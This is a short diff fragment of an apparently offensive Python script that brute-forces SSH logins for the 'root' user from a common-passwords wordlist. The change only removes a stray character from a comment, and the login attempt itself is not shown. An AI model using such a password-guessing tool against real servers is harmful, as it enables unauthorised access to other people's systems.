@@ -6,7 +6,7 @@ username = "root" #Choose your target Username
 attempts = 0 
 
 
-with open("top-20-common-SSH-passwords.txt", "r") as password_list: ~#Choose your wordlist
+with open("top-20-common-SSH-passwords.txt", "r") as password_list: #Choose your wordlist
 	for password in password_list:
 		password = password.strip("\n")
 		try:
